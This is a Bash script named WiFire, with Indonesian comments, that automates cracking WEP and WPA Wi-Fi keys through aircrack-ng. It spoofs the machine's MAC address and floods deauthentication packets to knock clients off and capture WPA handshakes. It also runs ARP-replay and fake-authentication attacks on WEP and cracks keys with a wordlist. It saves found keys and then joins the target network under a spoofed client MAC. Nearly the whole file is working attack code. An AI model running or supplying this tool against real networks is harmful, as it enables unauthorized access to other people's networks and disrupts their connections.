#!/bin/bash
#------------------------------COPYRIGHT------------------------------#
# WiFire Versi 0.2 (Automatic crack WPA/WEP key)
# Copyright (C) 2012 Krisan Alfa Timur A.K.A blusp10it
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#------------------------------COPYRIGHT------------------------------#
# Gunakan script ini secara bijak (=
#------------------------------VARIABEL DASAR------------------------------#
       interface=""                                            # Default
           versi="0.2"                                         # Versi
monitorInterface="mon0"                                        # Default
           bssid=""                                            # null
           essid=""                                            # null
         channel=""                                            # null
          client=""                                            # null
         fakeMac="00:05:7c:9a:58:3f"                           # mac address palsu
            plus="true"                                        # jika mendapatkan password, maka akan langsung dicoba
            trap 'cleanup interrupt' 2                         # menangkap interrupt CTRL+C
        wordlist="/pentest/passwords/wordlists/darkc0de.lst"   # Wordlist

#------------------------------MENCARI ACCESS POINT------------------------------#
cariAP() {
iwlist $interface scan > /tmp/WiFire.tmp
arrayESSID=( $(cat /tmp/WiFire.tmp | awk -F":" '/ESSID/{print $2}') )
arrayBSSID=( $(cat /tmp/WiFire.tmp | grep "Address:" | awk '{print $5}\') )
arrayChannel=( $(cat /tmp/WiFire.tmp | grep "Channel:" | tr ':' ' ' | awk '{print $2}\') )
arrayProtected=( $(cat /tmp/WiFire.tmp | grep "key:" | sed 's/.*key://g') )
arrayQuality=( $(cat /tmp/WiFire.tmp | grep "Quality" | sed 's/.*Quality=//g' | awk -F " " '{print $1}' ) )
id=""
index="0"
for item in "${arrayBSSID[@]}"; do
   if [ "$bssid" ] && [ "$bssid" == "$item" ] ; then id="$index" ;fi
   command=$(cat /tmp/WiFire.tmp | sed -n "/$item/, +20p" | grep "WPA" )
   if [ "$command" ] ; then arrayEncryption[$index]="WPA"
      elif [ ${arrayProtected[$index]} == "off" ] ; then arrayEncryption[$index]="N/A"
      else arrayEncryption[$index]="WEP" ; fi
   index=$(($index+1))
done
#------------------------------ESSID BER-SPASI------------------------------#
cat /tmp/WiFire.tmp | awk -F":" '/ESSID/{print $2}' | sed 's/\"//' | sed 's/\(.*\)\"/\1/' > /tmp/WiFire.ssid
index="0"
while read line ; do
   if [ "$essid" ] && [ "$essid" == "$line" ] ; then id="$index" ;  fi
   arrayESSID[$index]="$line"
   index=$(($index+1))
done < "/tmp/WiFire.ssid"
aksi "Menghapus file temporer" "rm -f /tmp/WiFire.ssid" "true"
}

#------------------------------AKSI DALAM TERMINAL------------------------------#
aksi() {
error="free"
if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Inisialisasi kode error
if [ "$error" == "free" ] ; then
     xterm="xterm"
     command=$2
          if [ "$3" == "2" ] ; then echo "Command: $command" ; fi
     $xterm -geometry 100x25+0+0 -T "WiFire versi $versi - $1" -e "$command" # line+x+y
     return 0
else
     echo -e "ERROR *_*"
     return 1
fi
}

#------------------------------MENCARI CLIENT------------------------------#
cariClient () {
if [ -z "$1" ] ; then error="1" ; fi # Inisialisasi kode error
if [ "$error" == "free" ] ; then
     client=""
     aksi "Menghapus file temporer" "rm -f /tmp/WiFire.dump* && sleep 1" "true"
     aksi "Menjalankan airodump-ng" "airodump-ng --bssid $bssid --channel $channel --write /tmp/WiFire.dump --output-format netxml $monitorInterface" "true" &
     sleep 3
#------------------------------KONDISI ENKRIPSI------------------------------#
     if [ "$1" == "WEP" ] || [ "$1" == "N/A" ] ; then
          sleep 3
          client=$(cat "/tmp/WiFire.dump-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/' | head -1)
     elif [ "$1" == "WPA" ] ; then
          while [ -z "$client" ] ; do
              sleep 2
              client=$(cat "/tmp/WiFire.dump-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/' | head -1)
          done
     fi
#------------------------------KONDISI ESSID------------------------------#
     if [ -z "$essid" ] ; then
          essid=$(cat "/tmp/WiFire.dump-01.kismet.netxml" | grep "<essid cloaked=\"false\">" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/')
     fi
#------------------------------KONDISI AIRODUMP-NG------------------------------#
     command=$(ps aux | grep "airodump-ng" | awk '!/grep/ && !/awk/ && !/cap/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
          if [ -n "$command" ] ; then
               aksi "Mematikan program" "kill $command" "true" # Jika ada proses airodump-ng, maka akan di-kill terlebih dulu
               sleep 3
          fi
     aksi "Menghapus file temporer" "rm -f /tmp/WiFire.dump*" "true"
     sleep 3
     if [ "$client" == "" ] ; then client="N/A" ; fi # Jika tidak ada klien
     return 0
#------------------------------KODE ERROR------------------------------#
else
     tampil error "Error *_*"
     return 1
fi
}
#------------------------------MENAMPILKAN PESAN------------------------------#
function tampil() {
error="free"
if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Inisialisasi kode error
if [ "$1" != "aksi" ] && [ "$1" != "info" ] && [ "$1" != "error" ] ; then error="5"; fi
if [ "$error" == "free" ] ; then
     keluaran=""
     if [ "$1" == "aksi" ] ; then keluaran="\e[01;32m[>]\e[00m" ; fi
     if [ "$1" == "info" ] ; then keluaran="\e[01;33m[i]\e[00m" ; fi
     if [ "$1" == "error" ] ; then keluaran="\e[01;31m[!]\e[00m" ; fi
     keluaran="$keluaran $2"
     echo -e "$keluaran"
     if [ "$3" == "true" ] ; then
          if [ "$1" == "aksi" ] ; then keluaran="[*]" ; fi
          if [ "$1" == "info" ] ; then keluaran="[i]" ; fi
          if [ "$1" == "error" ] ; then keluaran="[-]" ; fi
          echo -e "---------------------------------------------------------------------------------------------\n$keluaran $2"
     fi
     return 0
else
     tampil error "Error *_*"
     return 1
fi
}

#------------------------------CLEANUP------------------------------#
function cleanup() {
#------------------------------CEK ERROR USER------------------------------#
if [ "$1" == "nonuser" ] ; then exit 3 ; fi
aksi "Menutup xterm" "killall xterm" "true"
sleep 2
#------------------------------CLEAN------------------------------#
if [ "$1" != "clean" ] ; then
     echo # Blank
fi
#------------------------------STOP AIRMON------------------------------#
tampil aksi "Mengembalikan keadaan awal"
command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
if [ "$command" == "$monitorInterface" ] ; then
     sleep 3
     aksi "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface" "true"
fi
#------------------------------MENGHAPUS FILE TEMPORER------------------------------#
command="" # Inisialisai variabel command
#------------------------------FILE .CAP------------------------------#
tmp=$(ls /tmp/WiFire-*.cap 2> /dev/null)
if [ "$tmp" ] ; then command="$command /tmp/WiFire-*" ; fi
#------------------------------FILE .NETXML------------------------------#
tmp=$(ls /tmp/WiFire.dump*.netxml 2> /dev/null)
if [ "$tmp" ] ; then command="$command /tmp/WiFire.dump*" ; fi
#------------------------------FILE WiFire-----------------------------#
tmp=$(ls replay_arp*.cap 2> /dev/null)
if [ "$tmp" ] ; then command="$command replay_arp*.cap" ; fi
if [ -e "/tmp/WiFire.key" ] ; then command="$command /tmp/WiFire.key" ; fi
if [ -e "/tmp/WiFire.tmp" ] ; then command="$command /tmp/WiFire.tmp" ; fi
if [ -e "/tmp/WiFire.conf" ] ; then command="$command /tmp/WiFire.conf" ; fi
if [ -e "/tmp/WiFire.handshake" ] ; then command="$command /tmp/WiFire.handshake" ; fi
if [ -e "/tmp/WiFire.lst" ] ; then command="$command /tmp/WiFire.lst" ; fi
if [ -e "/tmp/WiFire.dic" ] ; then command="$command /tmp/WiFire.dic" ; fi
if [ -e "/tmp/interface" ] ; then command="$command /tmp/interface" ; fi
if [ -e "/tmp/WiFi.tmp" ] ; then command="$command /tmp/WiFi.tmp" ; fi
if [ ! -z "$command" ] ; then aksi "Menghapus file temporer" "rm -rfv $command" "true" ; fi
#------------------------------MENGEMBALIKAN NETWORK MANAGER------------------------------#
if [ -e "/etc/init.d/network-manager" ]; then
     aksi "Mengembalikan Network Manager" "/etc/init.d/network-manager start" "true"
     sleep 1
fi
#------------------------------MENGEMBALIKAN WICD------------------------------#
if [ -e "/etc/init.d/wicd" ]; then
     aksi "Mengembalikan WICD" "/etc/init.d/wicd start" "true"
     sleep 1
fi
echo -e "\e[01;34m[*]\e[00m Are you \e[01;36mblusp10it?\e[00m"
exit 0
}

##############################################################################
#------------------------------PROGRAM BERJALAN------------------------------#
##############################################################################
echo -e "_____    ______       _________               _____________
 __  |      / /   ( )    / ____  ( )             /  ______/
  _| |     / /  ____  __  /__  ____  ______ ____    /
  _| | /| / / ___  /   / __/____  / __  __/    /   __/
   | |/ |/ /    / / __  /      / /   / /    __    /____
 _____/\__/   _/_/   /_/  ______/   /_/      /________/ Versi $versi
Automatic WEP/WPA Cracker by blusp10it"
#------------------------------Menampilkan Info Wordlist------------------------------#
tampil info "Wordlist=$wordlist"
#------------------------------Melakukan Penyesuaian AirMon-ng------------------------------#
tampil aksi "Menganalisa keadaan"
aksi "Mempersiapkan airmon-ng" "airmon-ng check kill" "true"
sleep 2
#------------------------------Cek User Sebagai ROOT------------------------------#
if [ "$(id -u)" != "0" ] ; then tampil error "Jalankan script ini sebagai root." 1>&2 ; cleanup nonuser; fi
#------------------------------Menghapus File Temporer------------------------------#
tampil info "Menghapus file temporer"
command=""
tmp=$(ls /tmp/WiFire-*.cap 2> /dev/null)
if [ "$tmp" ] ; then command="$command /tmp/WiFire-*" ; fi
tmp=$(ls /tmp/WiFire.dump*.netxml 2> /dev/null)
if [ "$tmp" ] ; then command="$command /tmp/WiFire.dump*" ; fi
tmp=$(ls replay_arp*.cap 2> /dev/null)
if [ "$tmp" ] ; then command="$command replay_arp*.cap" ; fi
if [ -e "/tmp/WiFire.key" ] ; then command="$command /tmp/WiFire.key" ; fi
if [ -e "/tmp/WiFire.tmp" ] ; then command="$command /tmp/WiFire.tmp" ; fi
if [ -e "/tmp/WiFire.conf" ] ; then command="$command /tmp/WiFire.conf" ; fi
if [ -e "/tmp/WiFire.handshake" ] ; then command="$command /tmp/WiFire.handshake" ; fi
if [ -e "/tmp/WiFire.lst" ] ; then command="$command /tmp/WiFire.lst" ; fi
if [ -e "/tmp/WiFire.dic" ] ; then command="$command /tmp/WiFire.dic" ; fi
if [ -e "/tmp/interface" ] ; then command="$command /tmp/interface" ; fi
if [ -e "/tmp/WiFi.tmp" ] ; then command="$command /tmp/WiFi.tmp" ; fi
if [ ! -z "$command" ] ; then aksi "Menghapus file temporer" "rm -rfv $command" "true" ; fi
#------------------------------Memilih Interface------------------------------#
tampil info "Berikut adalah daftar interface yang sedang aktif"
ifconfig | grep "Link encap" | awk '{print $1}' > /tmp/WiFi.tmp
arrayInterface=( $(cat /tmp/WiFi.tmp) )
namaInterface=""
id=""
index="0"
loop=${#arrayInterface[@]}
loopSub="false"
for item in "${arrayInterface[@]}"; do
     if [ "$namaInterface" ] && [ "$namaInterface" == "$item" ] ; then id="$index" ; fi
     index=$(($index+1))
done
echo -e "  No | Interface |\n-----|-----------|"
for (( i=0;i<$loop;i++)); do
     printf ' %-3s | %-9s |\n' "$(($i+1))" "${arrayInterface[${i}]}"
     echo "$(($i+1))" "${arrayInterface[${i}]}" >> /tmp/interface
done
while [ "$loopSub" != "true" ] ; do
     read -p "[~] E[x]it atau pilih nomor tabel Interface: "
     if [ "$REPLY" == "x" ] ; then cleanup clean     # Aksi keluar, maka metode cleanup dipanggil
     elif [ -z $(echo "$REPLY" | tr -dc '[:digit:]'l) ] ; then tampil error "Pilihan tidak valid, $REPLY" 1>&2
     elif [ "$REPLY" -lt 1 ] || [ "$REPLY" -gt $loop ] ; then tampil error "Nomor tidak valid, $REPLY" 1>&2
     else id="$(($REPLY-1))" ; loopSub="true" ; loopMain="true"
     fi
done
interface="${arrayInterface[$id]}"
tampil info "Interface = $interface"
sleep 1
#------------------------------Mencetak hasil scan------------------------------#
tampil info "Mencari Access Point"
aksi "Melakukan refresh pada interface" "ifconfig $interface up && sleep 1" "true"
id=""             # variabel
index="0"         # variabel
loopMain="false"  # variabel
while [ "$loopMain" != "true" ] ; do
     cariAP
     if [ "$id" ] ; then
          loopMain="true"
     else
          if [ "$essid" ] ; then tampil error "Tidak dapat menemukan ESSID ($essid)" 1>&2 ; fi
          if [ "$bssid" ] ; then tampil error "Tidak dapat menemukan ESSID ($bssid)" 1>&2 ; fi
          loop=${#arrayBSSID[@]}
          echo -e " Num |         ESSID          |       BSSID       | Protected | Cha | Quality\n-----|------------------------|-------------------|-----------|-----|---------"
          for (( i=0;i<$loop;i++)); do
               printf '  %-2s | %-22s | %-16s | %3s (%-3s) |  %-3s|  %-6s\n' "$(($i+1))" "${arrayESSID[${i}]}" "${arrayBSSID[${i}]}" "${arrayProtected[${i}]}" "${arrayEncryption[${i}]}" "${arrayChannel[${i}]}" "${arrayQuality[${i}]}"
          done
          loopSub="false"
          while [ "$loopSub" != "true" ] ; do
               read -p "[~] re[s]can, e[x]it atau pilih nomor tabel AP: "
          if [ "$REPLY" == "x" ] ; then cleanup clean     # Aksi keluar
          elif [ "$REPLY" == "s" ] ; then loopSub="true"  # Scan ulang
          elif [ -z $(echo "$REPLY" | tr -dc '[:digit:]'l) ] ; then tampil error "Pilihan tidak valid [$REPLY]" 1>&2
          elif [ "$REPLY" -lt 1 ] || [ "$REPLY" -gt $loop ] ; then tampil error "Nomor tidak valid [$REPLY]" 1>&2
          else id="$(($REPLY-1))" ; loopSub="true" ; loopMain="true"
          fi
          done
     fi
done
#------------------------------Mengumpulkan Informasi------------------------------#
essid="${arrayESSID[$id]}"
bssid="${arrayBSSID[$id]}"
channel="${arrayChannel[$id]}"
encryption="${arrayEncryption[$id]}"
#------------------------------Memberikan Informasi------------------------------#
tampil info "Interface=$interface"
tampil info "Interface monitor=$monitorInterface"
tampil info "ESSID=$essid"
tampil info "BSSID=$bssid"
tampil info "Teknologi enkripsi=$encryption"
tampil info "Channel=$channel"
tampil info "Wordlist=$wordlist"
tampil info "Mac address palsu=$fakeMac"
sleep 1
#------------------------------Cek Dependency------------------------------#
tampil info "Mengecek program yang dibutuhkan"
#------------------------------AIRCRACK------------------------------#
tampil info "Mengecek aircrack -ng"
if [ "$(which aircrack-ng)" != "/usr/local/bin/aircrack-ng" ];then
     tampil error "Paket aircrack belum terinstal!!!"
     echo -en '\e[37;44m'"\033[1mApakah kamu mau menginstall paket AIRCRACK? (y/n) => \033[0m "
     read aircrack
     if [ $aircrack != 'y' ]; then
          echo -e "\e[0;31mExiting ...\e[00m \n\e[01;33mPastikan kamu sudah menginstall paket aircrack-ng sebelum melanjutkan (=\e[00m"
          cleanup clean
     else
          tampil aksi "Menginstall paket aircrack-ng..."
          apt-get update && apt-get install aircrack-ng -y
          tampil info "Selesai"
     fi
fi
#------------------------------MACCHANGER------------------------------#
tampil info "Mengecek macchanger"
if [ -e "/usr/local/bin/macchanger" ] && [ -e "/usr/bin/macchanger" ];then
     echo -e "\e[0;31mPaket macchanger belum terinstal!!!\e[00m"
     echo -en '\e[37;44m'"\033[1mApakah kamu mau menginstall paket MacChanger? (y/n) => \033[0m "
     read choice
     if [ $choice != 'y' ]; then
          echo -e "\e[0;31mExiting ...\e[00m \n\e[01;33mPastikan kamu sudah menginstall paket macchanger sebelum melanjutkan (=\e[00m"
          exit 1
     else
          echo -e "Menginstall paket macchanger..."
          apt-get update && apt-get install macchanger -y
          echo -e "Selesai!!!"
          sleep 2
     fi
     exit 1
fi
#------------------------------PENYESUAIAN------------------------------#
tampil aksi "Melakukan penyesuaian"
#------------------------------CEK INTERFACE MONITOR------------------------------#
tampil info "Mengecek keberadaan interface monitor yang aktif"
command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
if [ "$command" == "$monitorInterface" ] ; then
     aksi "Monitor Mode (Dihentikan)" "airmon-ng stop $monitorInterface" "true"
     sleep 2
fi
#------------------------------Menjalankan Mode Monitor------------------------------#
tampil aksi "Menjalankan monitor mode baru"
aksi "Monitor Mode (Berjalan)" "airmon-ng start $interface | awk '/monitor mode enabled on/ {print \$5}' | tr -d '\011' | sed -e \"s/(monitor mode enabled on //\" | sed 's/\(.*\)./\1/' > /tmp/WiFire.tmp" "true"
sleep 2
command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
if [ "$command" != "$monitorInterface" ] ; then
     sleep 3
     command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
     if [ "$command" != "$monitorInterface" ] ; then
          tampil error "Monitor interface $monitorInterface, tidak valid." 1>&2
          cleanup
     fi
fi
#------------------------------Mengganti Mac Address------------------------------#
tampil aksi "Mengkonfigurasikan: MAC address"
aksi "Mengganti mac address" "ifconfig $monitorInterface down && macchanger $monitorInterface -m $fakeMac && ifconfig $monitorInterface up" "true"
sleep 3
mac="$fakeMac"
#------------------------------ATTACK------------------------------#
#------------------------------Mencari Klien------------------------------#
if [ -z "$client" ] ; then
     tampil aksi "Mencari client"
     cariClient $encryption
fi
tampil info "Klien=$client"
sleep 1
#------------------------------AiroDump-ng------------------------------#
tampil aksi "Memulai: airodump-ng"
aksi "Menghapus file temporer" "rm -f /tmp/WiFire* && sleep 1" "true"
aksi "airodump-ng" "airodump-ng --bssid $bssid --channel $channel --write /tmp/WiFire --output-format cap $monitorInterface" "true" "0|0|13" &
sleep 3
#------------------------------ATTACK WEP------------------------------#
if [ "$encryption" == "WEP" ] ; then
#------------------------------WEP Tanpa Klien------------------------------#
     if [ "$client" == "N/A" ] ; then
          tampil aksi "Attack (FakeAuth): $fakeMac"
          aksi "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 30 -o 1 -q 10 -e \"$essid\" -a $bssid -h $fakeMac $monitorInterface" "true"
          client=$mac
          sleep 1
     fi
#------------------------------WEP Dengan Klien = $client------------------------------#
#------------------------------WEP ARPReplay dan DEAUTH Klien------------------------------#
     tampil aksi "Attack (ARPReplay+Deauth): $client"
     aksi "aireplay-ng (arpreplay)" "aireplay-ng --arpreplay -e \"$essid\" -b $bssid -h $client $monitorInterface" "true" "0|195|10" &
     sleep 2
     aksi "aireplay-ng (deauth)" "aireplay-ng --deauth 20 -e \"$essid\" -a $bssid -c $fakeMac $monitorInterface" "true"
     sleep 2
#------------------------------WEP FAKEAUTH CLIENT------------------------------#
     if [ "$client" == "$mac" ] ; then sleep 20 && aksi "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 0 -e \"$essid\" -a $bssid -h $fakeMac $monitorInterface" "true" ; fi
     sleep 60
#------------------------------ATTACK WPA------------------------------#
     elif [ "$encryption" == "WPA" ] ; then
          tampil aksi "Capturing: Handshake"
          loop="0"
          echo "blusp10it" > /tmp/WiFire.tmp
          for (( i ; ; )) ; do
               aksi "aircrack-ng" "aircrack-ng /tmp/WiFire*.cap -w /tmp/WiFire.tmp -e \"$essid\" > /tmp/WiFire.handshake" "true"
               command=$(cat /tmp/WiFire.handshake | grep "Passphrase not in dictionary")
               if [ "$command" ] ; then break; fi
               sleep 3
               if [ "$loop" != "1" ] ; then
                    if [ "$loop" != "0" ] ; then cariClient $encryption ; fi
                    sleep 2
                    if [ "" != "0" ] || [ "" == "true" ] ; then tampil aksi "Attack (Deauth): $client"  ; fi
                    aksi "aireplay-ng" "aireplay-ng --deauth 20 -a $bssid -c $client mon0" "true"
                    loop="1"
               else
                    if [ "" != "0" ] || [ "" == "true" ] ; then tampil aksi "Attack (Deauth): *semua client*" ; fi
                    aksi "aireplay-ng" "aireplay-ng --deauth 20 -a $bssid mon0" "true"
                    loop="2"
               fi
               sleep 1
          done
          if [ "" != "0" ] || [ "" == "true" ] ; then tampil aksi "Captured: Handshake"  ; fi
          aksi "Menutup semua proses" "killall xterm && sleep 3" "true"
     fi
#------------------------------CRACKING------------------------------#
#------------------------------ENKRIPSI WEP dan WPA------------------------------#
if [ "$encryption" == "WEP" ] || [ "$encryption" == "WPA" ] ; then
     tampil aksi "Memulai: aircrack-ng"
#------------------------------ENKRIPSI WEP------------------------------#
     if [ "$encryption" == "WEP" ] ; then aksi "aircrack-ng" "aircrack-ng /tmp/WiFire*.cap -e \"$essid\" -l /tmp/WiFire.key" "false" "0|350|30" ; fi
#------------------------------ENKRIPSI WPA------------------------------#
     if [ "$encryption" == "WPA" ] ; then aksi "aircrack-ng" "aircrack-ng /tmp/WiFire*.cap -w $wordlist -e \"$essid\" -l /tmp/WiFire.key" "false" "0|0|20" ; fi
fi
#------------------------------SELESAI CRACKING------------------------------#
aksi "Menutup semua proses" "killall xterm && sleep 3" "true"
aksi "airmon-ng" "airmon-ng stop $monitorInterface" "true"

#------------------------------TESTING KEY------------------------------#
if [ -e "/tmp/WiFire.key" ] ; then
     key=$(cat /tmp/WiFire.key)
     tampil info "WiFi key: $key"
#------------------------------EXPORT KEY------------------------------#
     echo -e "-----KEY FOUND-----
ESSID = $essid
BSSID = $bssid
  KEY = $key
Are you blusp10it?" >> /root/WiFire.key
     loop="true"
     while [ $loop != "false" ] ; do
          read -p "[~] Key ditemukan, apakah kamu ingin mencobanya? [y/n] "
          if [ "$REPLY" == "y" ] ; then
               plus="true"
               loop="false"
          elif [ "$REPLY" == "n" ] ; then
               plus="false"
               loop="false"
               cleanup clean
          else
               tampil error "Pilihan tidak valid!!! [$REPLY]" 1>&2
          fi
     done
#------------------------------Koneksi Ke Akses Poin------------------------------#
     if [ "$plus" == "true" ] ; then
          if [ "$client" != "$mac" ] ; then
               if [ "" != "0" ] || [ "" == "true" ] ; then tampil aksi "Attack (Spoofing): $client" ; fi
               aksi "airmon-ng" "ifconfig $interface down && macchanger -m $client $interface && ifconfig $interface up"   "true"
          fi
          tampil aksi "Bergabung: $essid"
          if [ "$encryption" == "WEP" ] ; then
               aksi "i[f/w]config" "ifconfig $interface down && iwconfig $interface essid $essid key $key && ifconfig $interface up"   "true"
          elif [ "$encryption" == "WPA" ] ; then
               aksi "wpa_passphrase" "wpa_passphrase $essid '$key' > /tmp/WiFire.conf" "true"
               aksi "wpa_supplicant" "wpa_supplicant -B -i $interface -c /tmp/WiFire.conf -D wext" "true"
          fi
          sleep 5
          aksi "dhclient" "dhclient $interface" "true"
          if [ "" != "0" ] || [ "" == "true" ] == "true" ] ; then
               ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
               tampil info "IP: $ourIP"
               gateway=$(route -n | grep $interface | awk '/^0.0.0.0/ {getline; print $2}')
               tampil info "Gateway: $gateway"
          fi
#------------------------------KEY Tidak Ditemukan, Memindahkan Handshake------------------------------#
     elif [ "$encryption" == "WPA" ] ; then
          tampil error "WiFi Key tidak ada dalam wordlist" 1>&2
          tampil aksi "Memindahkan handshake: $(pwd)/WiFire-$essid.cap" 1>&2
          aksi "Memindahkan paket tangkapan" "mv -f /tmp/WiFire*.cap $(pwd)/WiFire-$essid.cap" "true"
#------------------------------ERROR------------------------------#
     elif [ "$encryption" != "N/A" ] ; then
          tampil error "Terjadi kesalahan )=" 1>&2
     fi
fi
#------------------------------GOOD BYE------------------------------#
cleanup clean
